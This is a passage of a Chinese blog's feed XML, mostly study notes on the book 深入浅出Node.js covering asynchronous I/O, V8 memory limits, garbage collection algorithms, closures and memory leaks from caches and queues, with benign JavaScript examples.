&lt;li&gt;工程和科学面对的问题&lt;/li&gt;
&lt;
    
    </summary>
    
      <category term="架构" scheme="http://www.wanglinzhizhi.me/categories/%E6%9E%B6%E6%9E%84/"/>
    
    
      <category term="架构" scheme="http://www.wanglinzhizhi.me/tags/%E6%9E%B6%E6%9E%84/"/>
    
      <category term="前端架构" scheme="http://www.wanglinzhizhi.me/tags/%E5%89%8D%E7%AB%AF%E6%9E%B6%E6%9E%84/"/>
    
      <category term="工程化" scheme="http://www.wanglinzhizhi.me/tags/%E5%B7%A5%E7%A8%8B%E5%8C%96/"/>
    
      <category term="工程师与科学家" scheme="http://www.wanglinzhizhi.me/tags/%E5%B7%A5%E7%A8%8B%E5%B8%88%E4%B8%8E%E7%A7%91%E5%AD%A6%E5%AE%B6/"/>
    
  </entry>
  
  <entry>
    <title>程序员的浪漫</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/23/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E6%B5%AA%E6%BC%AB/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/23/程序员的浪漫/</id>
    <published>2017-01-23T11:41:55.000Z</published>
    <updated>2017-02-18T07:28:11.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="程序-员的浪漫"><a href="#程序-员的浪漫" class="headerlink" title="程序 员的浪漫"></a>程序 员的浪漫</h2><p><img src="/images/romances-of-programmers/1.png" alt="img"></p>
<p><img src="/images/romances-of-programmers/2.png" alt="img"></p>
<p><img src="/images/romances-of-programmers/3.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Hello world :)</div></pre></td></tr></table></figure>
<p>by wanglinzhizhi</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;程序-员的浪漫&quot;&gt;&lt;a href=&quot;#程序-员的浪漫&quot; class=&quot;headerlink&quot; title=&quot;程序 员的浪漫&quot;&gt;&lt;/a&gt;程序 员的浪漫&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/images/romances-of-programmers/1.png&quot; a
    
    </summary>
    
      <category term="wanglinzhizhi" scheme="http://www.wanglinzhizhi.me/categories/wanglinzhizhi/"/>
    
    
      <category term="wanglinzhizhi" scheme="http://www.wanglinzhizhi.me/tags/wanglinzhizhi/"/>
    
      <category term="程序员的浪漫" scheme="http://www.wanglinzhizhi.me/tags/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E6%B5%AA%E6%BC%AB/"/>
    
  </entry>
  
  <entry>
    <title>深入浅出Node.js  朴灵</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/23/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BANode/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/23/深入浅出Node/</id>
    <published>2017-01-23T11:16:17.000Z</published>
    <updated>2017-02-18T08:00:10.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="深入浅出Node-js"><a href="#深入浅出Node-js" class="headerlink" title="深入浅出Node.js"></a>深入浅出Node.js</h1><p><strong>朴灵</strong></p>
<h2 id="1-3-Node给JavaScript带来的意义"><a href="#1-3-Node给JavaScript带来的意义" class="headerlink" title="1.3 Node给JavaScript带来的意义"></a>1.3 Node给JavaScript带来的意义</h2><p>除了HTML、WebKit和显卡这些UI相关技术没有支持外，Node的结构与Chrome十分相似。它们都是基于事件驱动的异步架构，浏览器通过事件驱动来服务界面上的交互，Node通过事件驱动来服务I/O</p>
<p>在Node中，JavaScript可以随心所欲地访问本地文件，可以搭建WebSocket服务器端，可以连接数据库，可以如Web Workers一样玩转多进程。如今，JavaScript可以运行在不同的地方，不再继续限制在浏览器中与CSS样式表、DOM树打交道。如果HTTP协议栈是水平面，Node就是浏览器在协议栈另一边的倒影。Node不处理UI，但用与浏览器相同的机制和原理运行。Node打破了过去JavaScript只能在浏览器中运行的局面。前后端编程环境统一，可以大大降低前后端转换所需要的上下文交换代价。</p>
<p>随着Node的出现，关于JavaScript的想象总是无限的。目前，社区已经出现node-webkit这样的项目，这个项目在2012年的沪JS会议上首次介绍给了公众。如同上文提及的关于浏览器的优势和限制，在node-webkit项目中，它将Node中的事件循环和WebKit的事件循环融合在一起，既可以通过它享受HTML、CSS带来的UI构建，也能通过它访问本地资源，将两者的优势整合到一起。桌面应用程序的开发可以完全通过HTML、CSS、JavaScript完成。</p>
<h3 id="1-4-1-异步I-O"><a href="#1-4-1-异步I-O" class="headerlink" title="1.4.1 异步I/O"></a>1.4.1 异步I/O</h3><p>下面的代码用于发起一个Ajax请求：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"></div><div class="line">$.post(<span class="string">'/url'</span>, &#123;</div><div class="line">  <span class="attr">title</span>: <span class="string">'深入浅出Node.js'</span></div><div class="line">&#125;, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'收到响应'</span>);</div><div class="line">&#125;);</div><div class="line"><span class="built_in">console</span>.log(<span class="string">'发送Ajax结束'</span>);</div></pre></td></tr></table></figure>
<p>熟悉异步的用户必然知道，“收到响应”是在“发送Ajax结束”之后输出的。在调用$.post()后，后续代码是被立即执行的，而“收到响应”的执行时间是不被预期的。我们只知道它将在这个异步请求结束后执行，但并不知道具体的时间点。异步调用中对于结果值的捕获是符合“Don’t call me, I will call you”的原则的，这也是注重结果，不关心过程的一种表现</p>
<p>在Node中，异步I/O也很常见。以读取文件为例，我们可以看到它与前端Ajax调用的方式是极其类似的：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</div><div class="line">fs.readFile(<span class="string">'/path'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, file</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'读取文件完成'</span>)</div><div class="line">&#125;);</div><div class="line"><span class="built_in">console</span>.log(<span class="string">'发起读取文件'</span>);</div></pre></td></tr></table></figure>
<p>这里的“发起读取文件”是在“读取文件完成”之前输出的。同样，“读取文件完成”的执行也取决于读取文件的异步调用何时结束。图1-3是一个经典的异步调用。</p>
<p>在Node中，绝大多数的操作都以异步的方式进行调用。RyanDahl排除万难，在底层构建了很多异步I/O的API，从文件读取到网络请求等，均是如此。这样的意义在于，在Node中，我们可以从语言层面很自然地进行并行I/O操作。每个调用之间无须等待之前的I/O调用结束。在编程模型上可以极大提升效率。</p>
<p>下面的两个文件读取任务的耗时取决于最慢的那个文件读取的耗时：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"></div><div class="line">fs.readFile(<span class="string">'/path1'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, file</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'读取文件1完成'</span>);</div><div class="line">&#125;);</div><div class="line"></div><div class="line">fs.readFile(<span class="string">'/path2'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, file</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'读取文件2完成'</span>);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>而对于同步I/O而言，它们的耗时是两个任务的耗时之和</p>
<h3 id="5-1-1-Node与V8"><a href="#5-1-1-Node与V8" class="headerlink" title="5.1.1 Node与V8"></a>5.1.1 Node与V8</h3><p>关于V8，它的来历与背景亦是大有来头。作为虚拟机，V8的性能表现优异，这与它的领导者有莫大的渊源，Chrome的成功也离不开它背后的天才——Lars Bak</p>
<p>在Lars的工作履历里，绝大部分都是与虚拟机相关的工作。在开发V8之前，他曾经在Sun公司工作，担任HotSpot团队的技术领导，主要致力于开发高性能的Java虚拟机。在这之前，他也曾为Self、Smalltalk语言开发过高性能虚拟机。这些无与伦比的经历让V8一出世就超越了当时所有的JavaScript虚拟机。</p>
<p>Node在JavaScript的执行上直接受益于V8，可以随着V8的升级就能享受到更好的性能或新的语言特性（如ES5和ES6）等，同时也受到V8的一些限制，尤其是本章要重点讨论的内存限制。</p>
<h3 id="5-1-2-V8的内存限制"><a href="#5-1-2-V8的内存限制" class="headerlink" title="5.1.2 V8的内存限制"></a>5.1.2 V8的内存限制</h3><p>在一般的后端开发语言中，在基本的内存使用上没有什么限制，然而在Node中通过JavaScript使用内存时就会发现只能使用部分内存（64位系统下约为1.4 GB，32位系统下约为0.7GB）。在这样的限制下，将会导致Node无法直接操作大内存对象，比如无法将一个2 GB的文件读入内存中进行字符串分析处理，即使物理内存有32 GB。这样在单个Node进程的情况下，计算机的内存资源无法得到充足的使用。</p>
<p>造成这个问题的主要原因在于Node基于V8构建，所以在Node中使用的JavaScript对象基本上都是通过V8自己的方式来进行分配和管理的。V8的这套内存管理机制在浏览器的应用场景下使用起来绰绰有余，足以胜任前端页面中的所有需求。但在Node中，这却限制了开发者随心所欲使用大内存的想法。</p>
<h3 id="5-1-3-V8的对象分配"><a href="#5-1-3-V8的对象分配" class="headerlink" title="5.1.3 V8的对象分配"></a>5.1.3 V8的对象分配</h3><p>在V8中，所有的JavaScript对象都是通过堆来进行分配的</p>
<p>当我们在代码中声明变量并赋值时，所使用对象的内存就分配在堆中。如果已申请的堆空闲内存不够分配新的对象，将继续申请堆内存，直到堆的大小超过V8的限制为止</p>
<p>至于V8为何要限制堆的大小，表层原因为V8最初为浏览器而设计，不太可能遇到用大量内存的场景。对于网页来说，V8的限制值已经绰绰有余。深层原因是V8的垃圾回收机制的限制。按官方的说法，以1.5 GB的垃圾回收堆内存为例，V8做一次小的垃圾回收需要50毫秒以上，做一次非增量式的垃圾回收甚至要1秒以上。这是垃圾回收中引起JavaScript线程暂停执行的时间，在这样的时间花销下，应用的性能和响应能力都会直线下降。这样的情况不仅仅后端服务无法接受，前端浏览器也无法接受。因此，在当时的考虑下直接限制堆内存是一个好的选择。</p>
<p>当然，这个限制也不是不能打开，V8依然提供了选项让我们使用更多的内存。Node在启动时可以传递<code>--max-old-space-size</code>或<code>--max-new-space-size</code> 来调整内存限制的大小，示例如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">node --max-old-space-size=1700 test.js // 单位为MB// 或者</div><div class="line">node --max-new-space-size=1024 test.js // 单位为KB</div></pre></td></tr></table></figure>
<p>上述参数在V8初始化时生效，一旦生效就不能再动态改变。如果遇到Node无法分配足够内存给JavaScript对象的情况，可以用这个办法来放宽V8默认的内存限制，避免在执行过程中稍微多用了一些内存就轻易崩溃。</p>
<h3 id="5-1-4-V8的垃圾回收机制"><a href="#5-1-4-V8的垃圾回收机制" class="headerlink" title="5.1.4 V8的垃圾回收机制"></a>5.1.4 V8的垃圾回收机制</h3><p>V8的垃圾回收策略主要基于分代式垃圾回收机制。在自动垃圾回收的演变过程中，人们发现没有一种垃圾回收算法能够胜任所有的场景。因为在实际的应用中，对象的生存周期长短不一，不同的算法只能针对特定情况具有最好的效果。</p>
<p>在V8中，主要将内存分为新生代和老生代两代。新生代中的对象为存活时间较短的对象，老生代中的对象为存活时间较长或常驻内存的对象。</p>
<p>V8堆的整体大小就是新生代所用内存空间加上老生代的内存空间</p>
<p>前面我们提及的–max-old-space-size命令行参数可以用于设置老生代内存空间的最大值，–max-new-space-size命令行参数则用于设置新生代内存空间的大小的。比较遗憾的是，这两个最大值需要在启动时就指定。这意味着V8使用的内存没有办法根据使用情况自动扩充，当内存分配过程中超过极限值时，就会引起进程出错。</p>
<p>对于新生代内存，它由两个<code>reserved_semispace_size_</code> 所构成，后面将描述其原因。按机器位数不同，reserved_semispace<em>size</em>在64位系统和32位系统上分别为16 MB和8 MB。所以新生代内存的最大值在64位系统和32位系统上分别为32 MB和16 MB。</p>
<p>Cheney算法是一种采用复制的方式实现的垃圾回收算法。它将堆内存一分为二，每一部分空间称为semispace。在这两个semispace空间中，只有一个处于使用中，另一个处于闲置状态。处于使用状态的semispace空间称为From空间，处于闲置状态的空间称为To空间。当我们分配对象时，先是在From空间中进行分配。当开始进行垃圾回收时，会检查From空间中的存活对象，这些存活对象将被复制到To空间中，而非存活对象占用的空间将会被释放。完成复制后，From空间和To空间的角色发生对换。简而言之，在垃圾回收的过程中，就是通过将存活对象在两个semispace空间之间进行复制。</p>
<p>Scavenge的缺点是只能使用堆内存中的一半，这是由划分空间和复制机制所决定的。但Scavenge由于只复制存活的对象，并且对于生命周期短的场景存活对象只占少部分，所以它在时间效率上有优异的表现。</p>
<p>由于Scavenge是典型的牺牲空间换取时间的算法，所以无法大规模地应用到所有的垃圾回收中。但可以发现，Scavenge非常适合应用在新生代中，因为新生代中对象的生命周期较短，恰恰适合这个算法。</p>
<p>当一个对象经过多次复制依然存活时，它将会被认为是生命周期较长的对象。这种较长生命周期的对象随后会被移动到老生代中，采用新的算法进行管理。对象从新生代中移动到老生代中的过程称为晋升</p>
<p>对于老生代中的对象，由于存活对象占较大比重，再采用Scavenge的方式会有两个问题：一个是存活对象较多，复制存活对象的效率将会很低；另一个问题依然是浪费一半空间的问题。这两个问题导致应对生命周期较长的对象时Scavenge会显得捉襟见肘。为此，V8在老生代中主要采用了Mark-Sweep和Mark-Compact相结合的方式进行垃圾回收。</p>
<p>Mark-Sweep是标记清除的意思，它分为标记和清除两个阶段。与Scavenge相比，Mark-Sweep并不将内存空间划分为两半，所以不存在浪费一半空间的行为。与Scavenge复制活着的对象不同，Mark-Sweep在标记阶段遍历堆中的所有对象，并标记活着的对象，在随后的清除阶段中，只清除没有被标记的对象。可以看出，Scavenge中只复制活着的对象，而Mark-Sweep只清理死亡对象。活对象在新生代中只占较小部分，死对象在老生代中只占较小部分，这是两种回收方式能高效处理的原因</p>
<p>Mark-Sweep最大的问题是在进行一次标记清除回收后，内存空间会出现不连续的状态。这种内存碎片会对后续的内存分配造成问题，因为很可能出现需要分配一个大对象的情况，这时所有的碎片空间都无法完成此次分配，就会提前触发垃圾回收，而这次回收是不必要的。<br>为了解决Mark-Sweep的内存碎片问题，Mark-Compact被提出来。Mark-Compact是标记整理的意思，是在Mark-Sweep的基础上演变而来的。它们的差别在于对象在标记为死亡后，在整理的过程中，将活着的对象往一端移动，移动完成后，直接清理掉边界外的内存。</p>
<p>，在Mark-Sweep和Mark-Compact之间，由于Mark-Compact需要移动对象，所以它的执行速度不可能很快，所以在取舍上，V8主要使用Mark-Sweep，在空间不足以对从新生代中晋升过来的对象进行分配时才使用Mark-Compact。</p>
<p>为了避免出现JavaScript应用逻辑与垃圾回收器看到的不一致的情况，垃圾回收的3种基本算法都需要将应用逻辑暂停下来，待执行完垃圾回收后再恢复执行应用逻辑，这种行为被称为“全停顿”（stop-the-world）。在V8的分代式垃圾回收中，一次小垃圾回收只收集新生代，由于新生代默认配置得较小，且其中存活对象通常较少，所以即便它是全停顿的影响也不大。但V8的老生代通常配置得较大，且存活对象较多，全堆垃圾回收（full 垃圾回收）的标记、清理、整理等动作造成的停顿就会比较可怕，需要设法改善。</p>
<p>图5-8　增量标记示意图<br>V8在经过增量标记的改进后，垃圾回收的最大停顿时间可以减少到原本的1/6左右。V8后续还引入了延迟清理（lazy sweeping）与增量式整理（incremental compaction），让清理与整理动作也变成增量式的。同时还计划引入并行标记与并行清理，进一步利用多核性能降低每次停顿的时间。</p>
<p>从V8的自动垃圾回收机制的设计角度可以看到，V8对内存使用进行限制的缘由。新生代设计为一个较小的内存空间是合理的，而老生代空间过大对于垃圾回收并无特别意义。V8对内存限制的设置对于Chrome浏览器这种每个选项卡页面使用一个V8实例而言，内存的使用是绰绰有余了。对于Node编写的服务器端来说，内存限制也并不影响正常场景下的使用。但是对于V8的垃圾回收特点和JavaScript在单线程上的执行情况，垃圾回收是影响性能的因素之一。想要高性能的执行效率，需要注意让垃圾回收尽量少地进行，尤其是全堆垃圾回收。<br>以Web服务器中的会话实现为例，一般通过内存来存储，但在访问量大的时候会导致老生代中的存活对象骤增，不仅造成清理/整理过程费时，还会造成内存紧张，甚至溢出</p>
<h3 id="5-1-5-查看垃圾回收日志"><a href="#5-1-5-查看垃圾回收日志" class="headerlink" title="5.1.5 查看垃圾回收日志"></a>5.1.5 查看垃圾回收日志</h3><p>查看垃圾回收日志的方式主要是在启动时添加–trace_gc参数。在进行垃圾回收时，将会从标准输出中打印垃圾回收的日志信息。下面是一段示例，执行结束后，将会在gc.log文件中得到所有垃圾回收信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">node --trace_gc <span class="_">-e</span> <span class="string">"var a = [];for (var i = 0; i&lt; 1000000; i++) a.push(new Array(100));"</span> &gt; gc.log</div></pre></td></tr></table></figure>
<h3 id="5-2-高效使用内存"><a href="#5-2-高效使用内存" class="headerlink" title="5.2 高效使用内存"></a>5.2 高效使用内存</h3><p>高效使用内存<br>在V8面前，开发者所要具备的责任是如何让垃圾回收机制更高效地工作。</p>
<h3 id="5-2-1-作用域"><a href="#5-2-1-作用域" class="headerlink" title="5.2.1 作用域"></a>5.2.1 作用域</h3><p>提到如何触发垃圾回收，第一个要介绍的是作用域（scope）。在JavaScript中能形成作用域的有函数调用、with以及全局作用</p>
<p>foo()函数在每次被调用时会创建对应的作用域，函数执行结束后，该作用域将会销毁。同时作用域中声明的局部变量分配在该作用域上，随作用域的销毁而销毁。只被局部变量引用的对象存活周期较短</p>
<p>将会分配在新生代中的From空间中。在作用域释放后，局部变量local失效，其引用的对象将会在下次垃圾回收时被释放。</p>
<p>标识符查找<br>与作用域相关的即是标识符查找。所谓标识符，可以理解为变量名。在下面的代码中，执行bar()函数时，将会遇到local变量：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> bar = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(local);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>JavaScript在执行时会去查找该变量定义在哪里。它最先查找的是当前作用域，如果在当前作用域中无法找到该变量的声明，将会向上级的作用域里查找，直到查到为止。</p>
<h3 id="2-作用域链"><a href="#2-作用域链" class="headerlink" title="2. 作用域链"></a>2. 作用域链</h3><p>local变量在baz()函数形成的作用域里查找不到，继而将在bar()的作用域里寻找。如果去掉上述代码bar()中的local声明，将会继续向上查找，一直到全局作用域。这样的查找方式使得作用域像一个链条。由于标识符的查找方向是向上的，所以变量只能向外访问，而不能向内访问。</p>
<p>当我们在baz()函数中访问local变量时，由于作用域中的变量列表中没有local，所以会向上一个作用域中查找，接着会在bar()函数执行得到的变量列表中找到了一个local变量的定义，于是使用它。尽管在再上一层的作用域中也存在local的定义，但是不会继续查找了。如果查找一个不存在的变量，将会一直沿着作用域链查找到全局作用域，最后抛出未定义错误。</p>
<p>变量的主动释放</p>
<p>如果变量是全局变量（不通过var声明或定义在global变量上），由于全局作用域需要直到进程退出才能释放，此时将导致引用的对象常驻内存（常驻在老生代中）。如果需要释放常驻内存的对象，可以通过delete操作来删除引用关系。或者将变量重新赋值，让旧的对象脱离引用关系。在接下来的老生代内存清除和整理的过程中，会被回收释放。下面为示例代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">global.foo = <span class="string">"I am global object"</span>;</div><div class="line"><span class="built_in">console</span>.log(global.foo);<span class="comment">// =&gt;"I am global object"</span></div><div class="line"><span class="keyword">delete</span> global.foo;<span class="comment">// 或者重新赋值</span></div><div class="line">global.foo = <span class="literal">undefined</span>; <span class="comment">// or nullconsole.log(global.foo); // =&gt; undefined</span></div></pre></td></tr></table></figure>
<p>同样，如果在非全局作用域中，想主动释放变量引用的对象，也可以通过这样的方式。虽然delete操作和重新赋值具有相同的效果，但是在V8中通过delete删除对象的属性有可能干扰V8的优化，所以通过赋值方式解除引用更好。</p>
<h3 id="5-2-2-闭包"><a href="#5-2-2-闭包" class="headerlink" title="5.2.2 闭包"></a>5.2.2 闭包</h3><p>我们知道作用域链上的对象访问只能向上，这样外部无法向内部访问。</p>
<p>在JavaScript中，实现外部作用域访问内部作用域中变量的方法叫做闭包（closure）。这得益于高阶函数的特性：函数可以作为参数或者返回值。</p>
<p>一般而言，在bar()函数执行完成后，局部变量local将会随着作用域的销毁而被回收。但是注意这里的特点在于返回值是一个匿名函数，且这个函数中具备了访问local的条件。虽然在后续的执行中，在外部作用域中还是无法直接访问local，但是若要访问它，只要通过这个中间函数稍作周转即可</p>
<p>闭包是JavaScript的高级特性，利用它可以产生很多巧妙的效果。它的问题在于，一旦有变量引用这个中间函数，这个中间函数将不会释放，同时也会使原始的作用域不会得到释放，作用域中产生的内存占用也不会得到释放。除非不再有引用，才会逐步释放。</p>
<h3 id="5-2-3-小结"><a href="#5-2-3-小结" class="headerlink" title="5.2.3 小结"></a>5.2.3 小结</h3><p>在正常的JavaScript执行中，无法立即回收的内存有闭包和全局变量引用这两种情况。由于V8的内存限制，要十分小心此类变量是否无限制地增加，因为它会导致老生代中的对象增多</p>
<h3 id="5-3-内存指标"><a href="#5-3-内存指标" class="headerlink" title="5.3 内存指标"></a>5.3 内存指标</h3><p>一般而言，应用中存在一些全局性的对象是正常的，而且在正常的使用中，变量都会自动释放回收。但是也会存在一些我们认为会回收但是却没有被回收的对象，这会导致内存占用无限增长。一旦增长达到V8的内存限制，将会得到内存溢出错误，进而导致进程退出。</p>
<h3 id="5-3-2-堆外内存"><a href="#5-3-2-堆外内存" class="headerlink" title="5.3.2 堆外内存"></a>5.3.2 堆外内存</h3><p>我们看到15次循环都完整执行，并且三个内存占用值与前一个示例完全不同。在改造后的输出结果中，heapTotal与heapUsed的变化极小，唯一变化的是rss的值，并且该值已经远远超过V8的限制值。这其中的原因是Buffer对象不同于其他对象，它不经过V8的内存分配机制，所以也不会有堆内存的大小限制。</p>
<p>这意味着利用堆外内存可以突破内存限制的问题。<br>为何Buffer对象并非通过V8分配？这在于Node并不同于浏览器的应用场景。在浏览器中，JavaScript直接处理字符串即可满足绝大多数的业务需求，而Node则需要处理网络流和文件I/O流，操作字符串远远不能满足传输的性能需求。</p>
<h3 id="5-3-3-小结"><a href="#5-3-3-小结" class="headerlink" title="5.3.3 小结"></a>5.3.3 小结</h3><p>Node的内存构成主要由通过V8进行分配的部分和Node自行分配的部分。受V8的垃圾回收限制的主要是V8的堆内存。</p>
<h3 id="5-4-内存泄漏"><a href="#5-4-内存泄漏" class="headerlink" title="5.4 内存泄漏"></a>5.4 内存泄漏</h3><p>Node对内存泄漏十分敏感，一旦线上应用有成千上万的流量，那怕是一个字节的内存泄漏也会造成堆积，垃圾回收过程中将会耗费更多时间进行对象扫描，应用响应缓慢，直到进程内存溢出，应用崩</p>
<p>在V8的垃圾回收机制下，在通常的代码编写中，很少会出现内存泄漏的情况。但是内存泄漏通常产生于无意间，较难排查。尽管内存泄漏的情况不尽相同，但其实质只有一个，那就是应当回收的对象出现意外而没有被回收，变成了常驻在老生代中的对象。</p>
<p>通常，造成内存泄漏的原因有如下几个。<br>缓存。队列消费不及时。<br>作用域未释放。</p>
<h3 id="5-4-1-慎将内存当做缓存"><a href="#5-4-1-慎将内存当做缓存" class="headerlink" title="5.4.1 慎将内存当做缓存"></a>5.4.1 慎将内存当做缓存</h3><p>慎将内存当做缓存</p>
<p>缓存在应用中的作用举足轻重，可以十分有效地节省资源。因为它的访问效率要比I/O的效率高，一旦命中缓存，就可以节省一次I/O的时间。</p>
<p>但是在Node中，缓存并非物美价廉。一旦一个对象被当做缓存来使用，那就意味着它将会常驻在老生代中。缓存中存储的键越多，长期存活的对象也就越多，这将导致垃圾回收在进行扫描和整理时，对这些对象做无用功。<br>另一个问题在于，JavaScript开发者通常喜欢用对象的键值对来缓存东西，但这与严格意义上的缓存又有着区别，严格意义的缓存有着完善的过期策略，而普通对象的键值对并没有。</p>
<p>十分容易理解，如果需要，只要限定缓存对象的大小，加上完善的过期策略以防止内存无限制增长，还是可以一用的。</p>
<p>这里给出一个可能无意识造成内存泄漏的场景：memoize。</p>
<p>它的原理是以参数作为键进行缓存，以内存空间换CPU执行时间。这里潜藏的陷阱即是每个被执行的结果都会按参数缓存在memo对象上，不会被清除。这在前端网页这种短时应用场景中不存在大问题，但是执行量大和参数多样性的情况下，会造成内存占用不释放。</p>
<p>所以在Node中，任何试图拿内存当缓存的行为都应当被限制。当然，这种限制并不是不允许使用的意思，而是要小心为之。</p>
<p>为了解决缓存中的对象永远无法释放的问题，需要加入一种策略来限制缓存的无限增长。</p>
<p>为此我曾写过一个模块limitablemap，它可以实现对键值数量的限制。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> LimitableMap = <span class="function"><span class="keyword">function</span> (<span class="params">limit</span>) </span>&#123;</div><div class="line">  <span class="keyword">this</span>.limit = limit || <span class="number">10</span>; <span class="keyword">this</span>.map = &#123;&#125;;</div><div class="line">    <span class="keyword">this</span>.keys = [];</div><div class="line">  &#125;;</div><div class="line">  <span class="keyword">var</span> hasOwnProperty = <span class="built_in">Object</span>.prototype.hasOwnProperty;</div><div class="line">  LimitableMap.prototype.set = <span class="function"><span class="keyword">function</span> (<span class="params">key, value</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> map = <span class="keyword">this</span>.map; <span class="keyword">var</span> keys = <span class="keyword">this</span>.keys;</div><div class="line">    <span class="keyword">if</span> (!hasOwnProperty.call(map, key)) &#123;</div><div class="line">      <span class="keyword">if</span> (keys.length === <span class="keyword">this</span>.limit) &#123;</div><div class="line">        <span class="keyword">var</span> firstKey = keys.shift();</div><div class="line">        <span class="keyword">delete</span> map[firstKey];</div><div class="line">      &#125;</div><div class="line">      keys.push(key);</div><div class="line">    &#125;</div><div class="line">    map[key] = value;</div><div class="line">  &#125;;</div><div class="line">  LimitableMap.prototype.get = <span class="function"><span class="keyword">function</span> (<span class="params">key</span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.map[key];</div><div class="line">  &#125;;</div><div class="line">  <span class="built_in">module</span>.exports = LimitableMap</div></pre></td></tr></table></figure>
<p>实现过程还是非常简单的。记录键在数组中，一旦超过数量，就以先进先出的方式进行淘汰。</p>
<p>这种淘汰策略并不是十分高效，只能应付小型应用场景。如果需要更高效的缓存，可以参见Isaac Z.Schlueter采用LRU算法的缓存，地址为<a href="https://github.com/isaacs/node-lru-cache。结合有限制的缓存，memoize还是可用的。" target="_blank" rel="external">https://github.com/isaacs/node-lru-cache。结合有限制的缓存，memoize还是可用的。</a></p>
<p>另一个案例在于模块机制。在第2章的模块介绍中，为了加速模块的引入，所有模块都会通过编译执行，然后被缓存起来。由于通过exports导出的函数，可以访问文件模块中的私有变量，这样每个文件模块在编译执行后形成的作用域因为模块缓存的原因，不会被释放。示例代码如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"></div><div class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">exports, require, module, __filename, __dirname</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> local =<span class="string">"局部变量"</span>;</div><div class="line">  exports.get = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> local;</div><div class="line">  &#125;;</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>由于模块的缓存机制，模块是常驻老生代的。在设计模块时，要十分小心内存泄漏的出现。在下面的代码，每次调用leak()方法时，都导致局部变量leakArray不停增加内存的占用，且不被释放：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> leakArray = [];</div><div class="line">exports.leak = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  leakArray.push(<span class="string">"leak"</span> + <span class="built_in">Math</span>.random());</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>如果模块不可避免地需要这么设计，那么请添加清空队列的相应接口，以供调用者释放内存。</p>
<h3 id="缓存的解决方案"><a href="#缓存的解决方案" class="headerlink" title="缓存的解决方案"></a>缓存的解决方案</h3><p>直接将内存作为缓存的方案要十分慎重。除了限制缓存的大小外，另外要考虑的事情是，进程之间无法共享内存。如果在进程内使用缓存，这些缓存不可避免地有重复，对物理内存的使用是一种浪费。如何使用大量缓存，目前比较好的解决方案是采用进程外的缓存，进程自身不存储状态。外部的缓存软件有着良好的缓存过期淘汰策略以及自有的内存管理，不影响Node进程的性能。它的好处多多，在Node中主要可以解决以下两个问题。</p>
<p>（1）将缓存转移到外部，减少常驻内存的对象的数量，让垃圾回收更高效。<br>（2）进程之间可以共享缓存。</p>
<p>目前，市面上较好的缓存有Redis和Memcached。Node模块的生态系统十分完善，这两个产品的客户端都有，通过以下地址可以查看具体使用详情。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Redis：https://github.com/mranney/node_redis。</div><div class="line">Memcached：https://github.com/3rd-Eden/node-memcached。</div></pre></td></tr></table></figure>
<h3 id="5-4-2-关注队列状态"><a href="#5-4-2-关注队列状态" class="headerlink" title="5.4.2 关注队列状态"></a>5.4.2 关注队列状态</h3><p>关注队列状态</p>
<p>在解决了缓存带来的内存泄漏问题后，另一个不经意产生的内存泄漏则是队列。在第4章中可以看到，在JavaScript中可以通过队列（数组对象）来完成许多特殊的需求，比如Bagpipe。队列在消费者-生产者模型中经常充当中间产物。这是一个容易忽略的情况，因为在大多数应用场景下，消费的速度远远大于生产的速度，内存泄漏不易产生。但是一旦消费速度低于生产速度，将会形成堆积。</p>
<p>举个实际的例子，有的应用会收集日志。如果欠缺考虑，也许会采用数据库来记录日志。日志通常会是海量的，数据库构建在文件系统之上，写入效率远远低于文件直接写入，于是会形成数据库写入操作的堆积，而JavaScript中相关的作用域也不会得到释放，内存占用不会回落，从而出现内存泄漏。</p>
